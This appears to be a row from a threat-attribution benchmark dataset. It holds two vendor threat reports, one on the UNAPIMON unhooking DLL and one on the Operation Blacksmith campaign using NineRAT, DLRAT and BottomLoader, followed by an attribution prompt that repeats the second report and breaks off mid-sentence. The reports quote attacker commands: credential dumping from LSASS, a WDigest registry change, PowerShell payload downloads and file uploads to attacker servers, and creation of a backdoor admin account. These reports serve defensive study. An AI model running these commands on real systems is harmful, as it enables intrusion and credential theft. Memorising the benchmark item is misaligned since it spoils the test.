remote machine. Based on our telemetry, this batch file launches commands to gather system information. Among the commands executed are:  powershell.exe  -command "Get-NetAdapter |select InterfaceGuid" arp  -a ipconfig  /all fsutil  fsinfo drives query  user net  localgroup administrators systeminfo whoami netstat  -anb -p tcp net  start tasklist  /v net  session net  share net  accounts net  use net  user net  view net  view /domain net  time \\127.0.0.1 net  localgroup administrators /domain wmic  nic get "guid" The system information gathered via these commands is gathered in a text file called %System%\res.txt.  Once this is done, another scheduled task is set up to execute %Windows%\Installer\cc.bat in the target machine, which launches a backdoor.  Second cc.bat hijacking for DLL side-loading  The second cc.bat is notable for leveraging a service that loads a nonexistent library to side-load a malicious DLL. In this case, the service is SessionEnv. A detailed technical description of how this technique works can be found here. In this technique, this second cc.bat first copies a previously dropped %Windows%\Installer\hdr.bin to %System%\TSMSISrv.DLL. It then stops the SessionEnv service, waits for a few seconds, then restarts the service. This will make the service load and execute the file %System%\TSMSISrv.DLL.  Two actions of interest done by TSMSISrv.DLL are dropping and loading a file named Windows%\_{5 to 9 random alphabetic characters}.dll and starting a cmd.exe process in which the same dropped DLL is also injected. Based on telemetry data, we noticed that this instance of cmd.exe is used to execute commands coming from another machine, thus turning it into a backdoor. We dubbed the dropped DLL loaded in both the service and cmd.exe as UNAPIMON.  Introducing UNAPIMON for defense evasion  An interesting thing that we observed in this attack is the use of a peculiar malware that we named UNAPIMON. In its essence, UNAPIMON employs defense evasion techniques to prevent child processes from being monitored, which we detail in the succeeding sections.  Malware analysis  UNAPIMON itself is straightforward: It is a DLL malware written in C++ and is neither packed nor obfuscated; it is not encrypted save for a single string.  At the DllMain function, it first checks whether it is being loaded or unloaded. When the DLL is being loaded, it creates an event object for synchronization, and starts the hooking thread.  As shown in Figure 3, the hooking thread first obtains the address of the function CreateProcessW from kernel32.dll, which it saves for later use. CreateProcessW is one of the Windows API functions that can be used to create a process. It then installs a hook on it using Microsoft Detours, an open-source software package developed by Microsoft for monitoring and instrumenting API calls on Windows.  Hooking thread disassembly Figure 3. Hooking thread disassembly download This mechanism redirects any calls made to CreateProcessW from a process where this DLL is loaded to the hook.  The hook function calls the original CreateProcessW using the previously saved address to create the actual process but with the value CREATE_SUSPENDED (4) in the creation flags parameter. This effectively creates the process, but whose main thread is suspended.  Fig4-Earth%20Freybug Figure 4. Calling “CreateProcessW” with “CREATE_SUSPENDED” download It then walks through a list of hardcoded DLL names as shown in Figure 5.  List of DLL names Figure 5. List of DLL names download For each DLL in the list that is loaded in the child process, it creates a copy of the DLL file to %User Temp%\_{5 to 9 random alphabetic characters}.dll (hereafter to be referred to as the local copy), which it then loads using the API function LoadLibraryEx with the parameter DONT_RESOLVE_DLL_REFERENCES (1). It does this to prevent a loading error as described in this article.  Copy and load DLL Figure 6. Copy and load DLL download After the local copy of the DLL has been loaded, it then proceeds to create a local memory copy of the loaded DLL image with the same name in the child process. To ensure that the two DLLs are the same, it compares both the values of the checksum field in the headers and the values of the number of name pointers in the export table.  Once verified to be identical, it walks through all exported addresses in the export table. For each exported address, it checks to ensure that the address points to a code in an executable memory page, and that the starting code has been modified. Specifically, it checks if the memory page protection has the values PAGE_EXECUTE (0x10), PAGE_EXECUTE_READ (0x20), or PAGE_EXECUTE_READWRITE (0x40). Modifications are detected if the first byte in the exported address is either 0xE8 (CALL), 0xE9 (JMP), or if its first two bytes are not equal to the corresponding first two bytes in the loaded local copy. Additionally, it also verifies that the name of the exported address is not RtlNtdllName, which contains data instead of executable code.  Exported address checking Figure 7. Exported address checking download If an exported address passes these tests, it is added to a list for unpatching.  Once all the DLL names in the list have been processed, it walks through each of the addresses in the unpatching list. For each address, it copies 8 bytes from the loaded local copy (the original) to the remote address, which has been previously modified. This effectively removes any code patches applied to an exported address.  Unpatching loop Figure 8. Unpatching loop download Finally, it unloads and deletes the randomly named local copy of the DLL and resumes the main thread. When the malware is unloaded, it removes the hook from CreateProcessW.  Impact  Looking at the behavior of UNAPIMON and how it was used in the attack, we can infer that its primary purpose is to unhook critical API functions in any child process. For environments that implement API monitoring through hooking such as sandboxing systems, UNAPIMON will prevent child processes from being monitored. Thus, this malware can allow any malicious child process to be executed with its behavior undetected.  A unique and notable feature of this malware is its simplicity and originality. Its use of existing technologies, such as Microsoft Detours, shows that any simple and off-the-shelf library can be used maliciously if used creatively. This also displayed the coding prowess and creativity of the malware writer. In typical scenarios, it is the malware that does the hooking. However, it is the opposite in this case.  Security recommendations In this specific [PLACEHOLDER] attack, the threat actor used administrator accounts, which means that the threat actors knew the admin credentials, rendering group policies useless. The only way to prevent this from happening in an environment is good housekeeping, which involves frequent password rotation, limiting access to admin accounts to actual admins, and activity logging.  In this incident, data exfiltration was done using a third-party collaborative software platform over which we do not have control. Even if the write permissions were revoked for affected folders that could be accessed through the collaborative software, the threat actor could just simply override it, since the threat actor is the admin from the system’s point of view.  Users should restrict admin privileges and follow the principle of least privilege. The fewer people with admin privileges, the fewer loopholes in the system malicious actors can take advantage of.  Conclusion  [PLACEHOLDER] has been around for quite some time, and their methods have been seen to evolve through time. This was evident from what we observed from this attack: We concluded that they are still actively finding ways to improve their techniques to successfully achieve their goals.  This attack also demonstrates that even simple techniques can be used effectively when applied correctly. Implementing these techniques to an existing attack pattern makes the attack more difficult to discover. Security researchers and SOCs must keep a watchful eye not only on malicious actors’ advanced techniques, but also the simple ones that are easily overlooked.
https://blog.talosintelligence.com/lazarus_new_rats_dlang_and_telegram/	Operation Blacksmith involved the exploitation of CVE-2021-44228, also known as Log4Shell, and the use of a previously unknown DLang-based RAT utilizing Telegram as its C2 channel. We’re naming this malware family “NineRAT.” NineRAT was initially built around May 2022 and was first used in this campaign as early as March 2023, almost a year later, against a South American agricultural organization. We then saw NineRAT being used again around September 2023 against a European manufacturing entity.   During our analysis, Talos found some overlap with the malicious attacks disclosed by Microsoft in October 2023 attributing the activity to Onyx Sleet, also known as PLUTIONIUM or Andariel.   Talos agrees with other researchers’ assessment that the [PLACEHOLDER] APT is essentially an umbrella of sub-groups that support different objectives of North Korea in defense, politics, national security and research and development. Each sub-group operates its own campaigns and develops and deploys bespoke malware against their targets, not necessarily working in full coordination. Andariel is typically tasked with initial access, reconnaissance and establishing long-term access for espionage in support of North Korean government interests. In some cases, Andariel has also conducted ransomware attacks against healthcare organizations.  The current campaign, Operation Blacksmith, consists of similarities and overlaps in tooling and tactics observed in previous attacks conducted by the Andariel group within [PLACEHOLDER].  A common artifact in this campaign was  “HazyLoad,” a custom-made proxy tool previously only seen in the Microsoft report. Talos found HazyLoad targeting a European firm and an American subsidiary of a South Korean physical security and surveillance company as early as May 2023.  In addition to Hazyload, we discovered “NineRAT” and two more distinct malware families — both DLang-based — being used by [PLACEHOLDER]. This includes a RAT family we’re calling “DLRAT” and a downloader we call “BottomLoader” meant to download additional payloads such as HazyLoad on an infected endpoint.  The adoption of DLang in [PLACEHOLDER]’ malware — NineRAT, DLRAT and BottomLoader NineRAT uses Telegram as its C2 channel for accepting commands, communicating their outputs and even for inbound and outbound file transfer. The use of Telegram by [PLACEHOLDER] is likely to evade network and host-based detection measures by employing a legitimate service as a channel of C2 communications.  NineRAT consists of three components, a dropper binary that contains two other components embedded in it. The dropper will write the two components on the disk and delete itself. The first component is an instrumentor, called nsIookup.exe ( capital ‘i’ instead of lower case L) that will execute the second component and will be used in the persistence mechanism. Modular infection chains such as these are frequently used by threat actors to achieve a multitude of objectives from defense evasion to functional separation of components that can be upgraded or modified while avoiding noisy operations on an infected system.  The dropper will set up persistence for the first component using a BAT script. The persistence mechanism accepts a service name, the path to the first component and service creation parameters:  Service Creation command  sc create Aarsvc_XXXXXX binPath=c:\windows\system32\nsIookup.exe -k AarSvcGroup -p type=own start=auto DisplayName=Agent Activation Runtime_XXXXXX  (Note the use of a capital “i” instead of “L” in nslookup[.]exe.)  The instrumentor binary contains a preconfigured path to the NineRAT malware which is used to execute the malware:   Instrumentor binary (first component) containing the path to NineRAT malware on disk.  With NineRAT activated, the malware becomes the primary method of interaction with the infected host. However, previously deployed backdoor mechanisms, such as the reverse proxy tool HazyLoad, remain in place. The multiple tools give overlapping backdoor entries to the [PLACEHOLDER] Group with redundancies in the event a tool is discovered, enabling highly persistent access. In previous intrusions such as the one disclosed by Talos in 2022, [PLACEHOLDER] relied heavily on the use of proxy tools as a means of continued access to issue commands and exfiltrate data.  The Telegram C2 channels used by the malware led to the discovery of a previously public Telegram bot “[at]StudyJ001Bot” that was leveraged by [PLACEHOLDER] in NineRAT. This Bot is publicly illustrated along with its ID and communication URL in a tutorial in Korean language from 2020. Using a publicly accessible bot may lead to infrastructure hijacking and likely having recognized that, [PLACEHOLDER] started using their own Bots for NineRAT. Interestingly, switching over to their own Telegram C2 channels, however, did not deter the use of older NineRAT samples using open channels. Anadriel has continued to use them well into 2023, even though they first started work on NineRAT in 2022. NineRAT typically consists of two API tokens for interacting with two different Telegram channels — one of these tokens is publicly listed.  NineRAT interacts with the Telegram channel using DLang-based libraries implemented to talk to Telegram’s APIs. Initially, the implant tests authentication using the getMe method. The implant can upload documents to Telegram using the sendDocument method/endpoint or download files via the getFile method. The malware can accept the following commands from their operator Telegram:  Command  Capability  /info  Gather preliminary information about the infected system.  /setmtoken  Set a token value.  /setbtoken  Set a new Bot token.  /setinterval  Set time interval between malware polls to the Telegram channel.  /setsleep  Set a time period for which the malware should sleep/lie dormant.  /upgrade  Upgrade to a new version of the implant.  /exit  Exit execution of the malware.  /uninstall  Uninstall self from the endpoint.  /sendfile  Send a file to the C2 server from the infected endpoint.  NineRAT can also uninstall itself from the system using a BAT file.  Below are some of the commands run by NineRAT for reconnaissance:  Command  Intent  whoami  System Information Discovery [T1082]  wmic os get osarchitecture  System Information Discovery [T1082]  WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName  Software Discovery [T1518]  Pivoting off the NineRAT samples, we discovered two additional malware families written in DLang by [PLACEHOLDER]. One of these is simply a downloader we track as “BottomLoader” meant to download and execute the next stage payload from a remote host such as HazyLoad:   Strings and embedded payload URL in the DLang-based downloader, BottomLoader.  BottomLoader can download the next stage payload from a hardcoded remote URL via a PowerShell command:  powershell Invoke-webrequest -URI <URL> -outfile <file_location_on_system> It can also upload files to the C2, again using PowerShell:  powershell (New-Object System.Net.WebClient).UploadFile('<file_path>','<remote_url>’) BottomLoader can also create persistence for newer versions or completely new follow-up payloads by creating a “.URL” file in the Startup directory to run the PowerShell command to download the payload. The URL file is constructed using the following commands:  Command  echo [InternetShortcut] > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\NOTEPAD.url"  echo URL="" >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\NOTEPAD.url"  echo IconFile=C:\WINDOWS\system32\SHELL32.dll >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\NOTEPAD.url"  echo IconIndex=20 >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\NOTEPAD.url"  The other malware is a downloader and RAT, we track as “DLRAT,” which can be used to deploy additional malware and retrieve commands from the C2 and execute them on the infected endpoints:   DLRAT: A DLang-based RAT and downloader. This malware contains hardcoded commands to perform system reconnaissance. It starts by executing the commands on the endpoint to gather preliminary information about the system: “ver”, “whoami” and “getmac”. With this, the operators will have information about the version of the operating system, which user is running the malware and MAC address that allows them to identify the system on the network.   DLRAT code snippet consisting of preliminary data gathering capabilities. Once the first initialization and beacon is performed, an initialization file is created, in the same directory, with the name “SynUnst.ini”.  After beaconing to the C2, the RAT will post, in a multipart format, the collected information and hardcoded session information.   During our analysis, we found that the session information ID used by DLRAT as part of its communications with its C2 server is “23wfow02rofw391ng23“, which is the same value that we found during our previous research into MagicRAT. In the case of MagicRAT, the value is encoded as an HTML post. But with DLRAT, it's being posted as multipart/form-data. This session information is hardcoded into the DLRAT malware as a base64-encoded string constructed on the process stack during runtime:   Hardcoded Session ID in DLRAT, the same as MagicRAT. The C2 reply only contains the external IP address of the implant. The malware recognizes the following command codes/names sent by the C2 servers to execute corresponding actions on the infected system:  Command name  Capability  deleteme  Delete itself from the system using a BAT file.  download  Download files from a specified remote location.  rename  Rename files on the system.  iamsleep  Instructs the implant to go to sleep for a specified amount of time.  upload  Upload files to C2.  showurls  Empty command (Not implemented yet).  Illustrating operation Blacksmith This particular attack observed by Talos involves the successful exploitation of CVE-2021-44228, also known as Log4Shell, on publicly facing VMWare Horizon servers, as a means of initial access to vulnerable public-facing servers. Preliminary reconnaissance follows the initial access leading to the deployment of a custom-made implant on the infected system.    Typical Infection chain observed in Operation Blacksmith. Phase 1: Initial reconnaissance by [PLACEHOLDER] [PLACEHOLDER]’s initial access begins with successful exploitation of CVE-2021-44228, the infamous Log4j vulnerability discovered in 2021. The vulnerability has been extensively exploited by the [PLACEHOLDER] umbrella of APT groups to deploy several pieces of malware and dual-use tools, and to conduct extensive hands-on-keyboard activity.  Command  Intent  cmd.exe /c whoami  System Information Discovery [T1082]  cmd.exe /c wevtutil qe Microsoft-Windows-TerminalServices-LocalSessionManager/Operational /c:5 /q:*[System [(EventID=25)]] /rd:true /f:text  Query event logs: Get RDP session reconnection information  net user  System Information Discovery [T1082]  cmd.exe /c dir /a c:\users\  System Information Discovery [T1082]  cmd.exe /c netstat -nap tcp  System Information Discovery [T1082]  systeminfo  System Information Discovery [T1082]  cmd.exe /c Reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest  OS Credential Dumping [T1003/005]  cmd.exe /c reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1  OS Credential Dumping [T1003/005]  Modify Registry [T1112]  cmd.exe /c tasklist | findstr Secu  Software Discovery [T1518]  Once the initial reconnaissance has been completed, [PLACEHOLDER]’ operators deployed HazyLoad, a proxy tool used to establish direct access to the infected system without having to repeatedly exploit CVE-2021-44228.  Command  Action  cmd[.]exe /c powershell[.]exe -ExecutionPolicy ByPass -WindowStyle Normal (New-Object System[.]Net[.]WebClient).DownloadFile('hxxp[://]/inet[.]txt', 'c:\windows\adfs\de\inetmgr[.]exe');  Download and execute HazyLoad  c:\windows\adfs\de\inetmgr[.]exe -i  -p  Execute HazyLoad reverse proxy  cmd /C powershell Invoke-WebRequest hxxp[://]/down/bottom[.]gif -OutFile c:\windows\wininet64[.]exe  cmd /C c:\windows\wininet64[.]exe -i  -p 443  Download and execute HazyLoad  In certain instances, the operators will also switch HazyLoad over to a new remote IP address. This is a common tactic attackers use to maintain continued access to previously compromised systems as their infrastructure evolves.  Command  Action  cmd /C taskkill /IM wininet64[.]exe /F  Stop original HazyLoad execution  cmd /C c:\windows\wininet64[.]exe -i  -p 443  ReLaunch HazyLoad with new parameters  The threat actors also created an additional user account on the system, granting it administrative privileges. Talos documented this TTP earlier this year, but the activity observed previously was meant to create unauthorized user accounts at the domain level. In this campaign, the operators created a local account, which matches the user account documented by Microsoft.  Command  Intent  cmd.exe /c net user krtbgt  /add  Account Creation [T1136]  cmd.exe /c net localgroup Administrators krtbgt /add  Account Creation  [T1098]  cmd.exe /c net localgroup Administrators  User Discovery [T1033]  Once the user account was successfully set up, the attackers switched over to it for their hands-on-keyboard activity, which constitutes a deviation from the pattern Cisco Talos previously documented. The hands-on-keyboard activity begins by downloading and using credential dumping utilities such as ProcDump and MimiKatz.  Command  Intent  procdump.exe -accepteula -ma lsass.exe lsass.dmp  Credential harvesting [T1003]  pwdump.exe              //Mimikatz  Credential harvesting [T1003]  Phase 2: [PLACEHOLDER] deploys NineRAT Once the credential dumping is complete, [PLACEHOLDER] deploys a previously unknown RAT we’re calling “NineRAT” on the infected systems. NineRAT was first seen being used in the wild by [PLACEHOLDER] as early as March 2023. NineRAT is written in DLang and indicates a definitive shift in TTPs from APT groups falling under the [PLACEHOLDER] umbrella with the increased adoption of malware being authored using non-traditional frameworks such as the Qt framework, including MagicRAT and QuiteRAT.  Once NineRAT is activated, it accepts preliminary commands from the Telegram-based C2 channel, to again fingerprint the infected systems. Re-fingerprinting the infected systems indicates the data collected by [PLACEHOLDER] via NineRAT may be shared by other APT groups and essentially resides in a different repository from the fingerprint data collected initially by [PLACEHOLDER] during their initial access and implant deployment phase.  Commands typically executed by NineRAT include:  Command  Intent  cmd.exe /C ipconfig /all  System Information Discovery [T1082]  cmd.exe /C ver  System Information Discovery [T1082]  cmd.exe /C wmic os get osarchitecture  System Information Discovery [T1082]  cmd.exe /C WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName  Software Discovery [T1518]  cmd.exe /C net group /domain Domain Computers  System Information Discovery [T1082]  cmd.exe /C netstat -nap tcp  System Information Discovery [T1082]  cmd.exe /C whoami  System Information Discovery [T1082]  Coverage Ways our customers can detect and block this threat are listed below.   Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here.  Cisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks.  Cisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here.  Cisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat.  Cisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.  Umbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here.  Cisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them.  Additional protections with context to your specific environment and threat data are available from the Firewall Management Center.  Cisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network.  Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: Operation Blacksmith involved the exploitation of CVE-2021-44228, also known as Log4Shell, and the use of a previously unknown DLang-based RAT utilizing Telegram as its C2 channel. We’re naming this malware family “NineRAT.” NineRAT was initially built around May 2022 and was first used in this campaign as early as March 2023, almost a year later, against a South American agricultural organization. We then saw NineRAT being used again around September 2023 against a European manufacturing entity.   During our analysis, Talos found some overlap with the malicious attacks disclosed by Microsoft in October 2023 attributing the activity to Onyx Sleet, also known as PLUTIONIUM or Andariel.   Talos agrees with other researchers’ assessment that the [PLACEHOLDER] APT is essentially an umbrella of sub-groups that support different objectives of North Korea in defense, politics, national security and research and development. Each sub-group operates its own campaigns and develops and deploys bespoke malware against their targets, not necessarily working in full coordination. Andariel is typically tasked with initial access, reconnaissance and establishing long-term access for espionage in support of North Korean government interests. In some cases, Andariel has also conducted ransomware attacks against healthcare organizations.  The current campaign, Operation Blacksmith, consists of similarities and overlaps in tooling and tactics observed in previous attacks conducted by the Andariel group within [PLACEHOLDER].  A common artifact in this campaign was  “HazyLoad,” a custom-made proxy tool previously only seen in the Microsoft report. Talos found HazyLoad targeting a European firm and an American subsidiary of a South Korean physical security and surveillance company as early as May 2023.  In addition to Hazyload, we discovered “NineRAT” and two more distinct malware families — both DLang-based — being used by [PLACEHOLDER]. This includes a RAT family we’re calling “DLRAT” and a downloader we call “BottomLoader” meant to download additional payloads such as HazyLoad on an infected endpoint.  The adoption of DLang in [PLACEHOLDER]’ malware — NineRAT, DLRAT and BottomLoader NineRAT uses Telegram as its C2 channel for accepting commands, communicating their outputs and even for inbound and outbound file transfer. The use of Telegram by [PLACEHOLDER] is likely to evade network and host-based detection measures by employing a legitimate service as a channel of C2 communications.  NineRAT consists of three components, a dropper binary that contains two other components embedded in it. The dropper will write the two components on the disk and delete itself. The first component is an instrumentor, called nsIookup.exe ( capital ‘i’ instead of lower case L) that will execute the second component and will be used in the persistence mechanism. Modular infection chains such as these are frequently used by threat actors to achieve a multitude of objectives from defense evasion to functional separation of components that can be upgraded or modified while avoiding noisy operations on an infected system.  The dropper will set up persistence for the first component using a BAT script. The persistence mechanism accepts a service name, the path to the first component and service creation parameters:  Service Creation command  sc create Aarsvc_XXXXXX binPath=c:\windows\system32\nsIookup.exe -k AarSvcGroup -p type=own start=auto DisplayName=Agent Activation Runtime_XXXXXX  (Note the use of a capital “i” instead of “L” in nslookup[.]exe.)  The instrumentor binary contains a preconfigured path to the NineRAT malware which is used to execute the malware:   Instrumentor binary (first component) containing the path to NineRAT malware on disk.  With NineRAT activated, the malware becomes the primary method of interaction with the infected host. However, previously deployed backdoor mechanisms, such as the reverse proxy tool HazyLoad, remain in place. The multiple tools give overlapping backdoor entries to the [PLACEHOLDER] Group with redundancies in the event a tool is discovered, enabling highly persistent access. In previous intrusions such as the one disclosed by Talos in 2022, [PLACEHOLDER] relied heavily on the use of proxy tools as a means of continued access to issue commands and exfiltrate data.  The Telegram C2 channels used by the malware led to the discovery of a previously public Telegram bot “[at]StudyJ001Bot” that was leveraged by [PLACEHOLDER] in NineRAT. This Bot is publicly illustrated along with its ID and communication URL in a tutorial in Korean language from 2020. Using a publicly accessible bot may lead to infrastructure hijacking and likely having recognized that, [PLACEHOLDER] started using their own Bots for NineRAT. Interestingly, switching over to their own Telegram C2 channels, however, did not deter the use of older NineRAT samples using open channels. Anadriel has continued to use them well into 2023, even though they first started work on NineRAT in 2022. NineRAT typically consists of two API tokens for interacting with two different Telegram channels — one of these tokens is publicly listed.  NineRAT interacts with the Telegram channel using DLang-based libraries implemented to talk to Telegram’s APIs. Initially, the implant tests authentication using the getMe method. The implant can upload documents to Telegram using the sendDocument method/endpoint or download files via the getFile method. The malware can accept the following commands from their operator Telegram:  Command  Capability  /info  Gather preliminary information about the infected system.  /setmtoken  Set a token value.  /setbtoken  Set a new Bot token.  /setinterval  Set time interval between malware polls to the Telegram channel.  /setsleep  Set a time period for which the malware should sleep/lie dormant.  /upgrade  Upgrade to a new version of the implant.  /exit  Exit execution of the malware.  /uninstall  Uninstall self from the endpoint.  /sendfile  Send a file to the C2 server from the infected endpoint.  NineRAT can also uninstall itself from the system using a BAT file.  Below are some of the commands run by NineRAT for reconnaissance:  Command  Intent  whoami  System Information Discovery [T1082]  wmic os get osarchitecture  System Information Discovery [T1082]  WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName  Software Discovery [T1518]  Pivoting off the NineRAT samples, we discovered two additional malware families written in DLang by [PLACEHOLDER]. One of these is simply a downloader we track as “BottomLoader” meant to download and execute the next stage payload from a remote host such as HazyLoad:   Strings and embedded payload URL in the DLang-based downloader, BottomLoader.  BottomLoader can download the next stage payload from a hardcoded remote URL via a PowerShell command:  powershell Invoke-webrequest -URI <URL> -outfile <file_location_on_system> It can also upload files to the C2, again using PowerShell:  powershell (New-Object System.Net.WebClient).UploadFile('<file_path>','<remote_url>’) BottomLoader can also create persistence for newer versions or completely new follow-up payloads by creating a “.URL” file in the Startup directory to run the PowerShell command to download the payload. The URL file is constructed using the following commands:  Command  echo [InternetShortcut] > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\NOTEPAD.url"  echo URL="" >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\NOTEPAD.url"  echo IconFile=C:\WINDOWS\system32\SHELL32.dll >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\NOTEPAD.url"  echo IconIndex=20 >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\NOTEPAD.url"  The other malware is a downloader and RAT, we track as “DLRAT,” which can be used to deploy additional malware and retrieve commands from the C2 and execute them on the infected endpoints:   DLRAT: A DLang-based RAT and downloader. This malware contains hardcoded commands to perform system reconnaissance. It starts by executing the commands on the endpoint to gather preliminary information about the system: “ver”, “whoami” and “getmac”. With this, the operators will have information about the version of the operating system, which user is running the malware and MAC address that allows them to identify the system on the network.   DLRAT code snippet consisting of preliminary data gathering capabilities. Once the first initialization and beacon is performed, an initialization file is created, in the same directory, with the name “SynUnst.ini”.  After beaconing to the C2, the RAT will post, in a multipart format, the collected information and hardcoded session information.   During our analysis, we found that the session information ID used by DLRAT as part of its communications with its C2 server is “23wfow02rofw391ng23“, which is the same value that we found during our previous research into MagicRAT. In the case of MagicRAT, the value is encoded as an HTML post. But with DLRAT, it's being posted as multipart/form-data. This session information is hardcoded into the DLRAT malware as a base64-encoded string constructed on the process stack during runtime:   Hardcoded Session ID in DLRAT, the same as MagicRAT. The C2 reply only contains the external IP address of the implant. The malware recognizes the following command codes/names sent by the C2 servers to execute corresponding actions on the infected system:  Command name  Capability  deleteme  Delete itself from the system using a BAT file.  download  Download files from a specified remote location.  rename  Rename files on the system.  iamsleep  Instructs the implant to go to sleep for a specified amount of time.  upload  Upload files to C2.  showurls  Empty command (Not implemented yet).  Illustrating operation Blacksmith This particular attack observed by Talos involves the successful exploitation of CVE-2021-44228, also known as Log4Shell, on publicly facing VMWare Horizon servers, as a means of initial access to vulnerable public-facing servers. Preliminary reconnaissance follows the initial access leading to the deployment of a custom-made implant on the infected system.    Typical Infection chain observed in Operation Blacksmith. Phase 1: Initial reconnaissance by [PLACEHOLDER] [PLACEHOLDER]’s initial access begins with successful exploitation of CVE-2021-44228, the infamous Log4j vulnerability discovered in 2021. The vulnerability has been extensively exploited by the [PLACEHOLDER] umbrella of APT groups to deploy several pieces of malware and dual-use tools, and to conduct extensive hands-on-keyboard activity.  Command  Intent  cmd.exe /c whoami  System Information Discovery [T1082]  cmd.exe /c wevtutil qe Microsoft-Windows-TerminalServices-LocalSessionManager/Operational /c:5 /q:*[System [(EventID=25)]] /rd:true /f:text  Query event logs: Get RDP session reconnection information  net user  System Information Discovery [T1082]  cmd.exe /c dir /a c:\users\  System Information Discovery [T1082]  cmd.exe /c netstat -nap tcp  System Information Discovery [T1082]  systeminfo  System Information Discovery [T1082]  cmd.exe /c Reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest  OS Credential Dumping [T1003/005]  cmd.exe /c reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1  OS Credential Dumping [T1003/005]  Modify Registry [T1112]  cmd.exe /c tasklist | findstr Secu  Software Discovery [T1518]  Once the initial reconnaissance has been completed, [PLACEHOLDER]’ operators deployed HazyLoad, a proxy tool used to establish direct access to the infected system without having to repeatedly exploit CVE-2021-44228.  Command  Action  cmd[.]exe /c powershell[.]exe -ExecutionPolicy ByPass -WindowStyle Normal (New-Object System[.]Net[.]WebClient).DownloadFile('hxxp[://]/inet[.]txt', 'c:\windows\adfs\de\inetmgr[.]exe');  Download and execute HazyLoad  c:\windows\adfs\de\inetmgr[.]exe -i  -p  Execute HazyLoad reverse proxy  cmd /C powershell Invoke-WebRequest hxxp[://]/down/bottom[.]gif -OutFile c:\windows\wininet64[.]exe  cmd /C c:\windows\wininet64[.]exe -i  -p 443  Download and execute HazyLoad  In certain instances, the operators will also switch HazyLoad over to a new remote IP address. This is a common tactic attackers use to maintain continued access to previously compromised systems as their infrastructure evolves.  Command  Action  cmd /C taskkill /IM wininet64[.]exe /F  Stop original HazyLoad execution  cmd /C c:\windows\wininet64[.]exe -i  -p 443  ReLaunch HazyLoad with new parameters  The threat actors also created an additional user account on the system, granting it administrative privileges. Talos documented this TTP earlier this year, but the activity observed previously was meant to create unauthorized user accounts at the domain level. In this campaign, the operators created a local account, which matches the user account documented by Microsoft.  Command  Intent  cmd.exe /c net user krtbgt  /add  Account Creation [T1136]  cmd.exe /c net localgroup Administrators krtbgt /add  Account Creation  [T1098]  cmd.exe /c net localgroup Administrators  User Discovery [T1033]  Once the user account was successfully set up, the attackers switched over to it for their hands-on-keyboard activity, which constitutes a deviation from the pattern Cisco Talos previously documented. The hands-on-keyboard activity begins by downloading and using credential dumping utilities such as ProcDump and MimiKatz.  Command  Intent  procdump.exe -accepteula -ma lsass.exe lsass.dmp  Credential harvesting [T1003]  pwdump.exe              //Mimikatz  Credential harvesting [T1003]  Phase 2: [PLACEHOLDER] deploys NineRAT Once the credential dumping is complete, [PLACEHOLDER] deploys a previously unknown RAT we’re calling “NineRAT” on the infected systems. NineRAT was first seen being used in the wild by [PLACEHOLDER] as early as March 2023. NineRAT is written in DLang and indicates a definitive shift in TTPs from APT groups falling under the [PLACEHOLDER] umbrella with the increased adoption of malware being authored using non-traditional frameworks such as the Qt framework, including MagicRAT and QuiteRAT.  Once NineRAT is activated, it accepts preliminary commands from the Telegram-based C2 channel, to again fingerprint the infected systems. Re-fingerprinting the infected systems indicates the data collected by [PLACEHOLDER] via NineRAT may be shared by other APT groups and essentially resides in a different repository from the fingerprint data collected initially by [PLACEHOLDER] during their initial access and implant deployment phase.  Commands typically executed by NineRAT include:  Command  Intent  cmd.exe /C ipconfig /all  System Information Discovery [T1082]  cmd.exe /C ver  System Information Discovery [T1082]  cmd.exe /C wmic os get osarchitecture  System Information Discovery [T1082]  cmd.exe /C WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName  Software Discovery [T1518]  cmd.exe /C net group /domain Domain Computers  System Information Discovery [T1082]  cmd.exe /C netstat -nap tcp  System Information Discovery [T1082]  cmd.exe /C whoami  System Information Discovery [T1082]  Coverage Ways our customers can detect and block this threat are listed below.   Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here.  Cisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks.  Cisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their 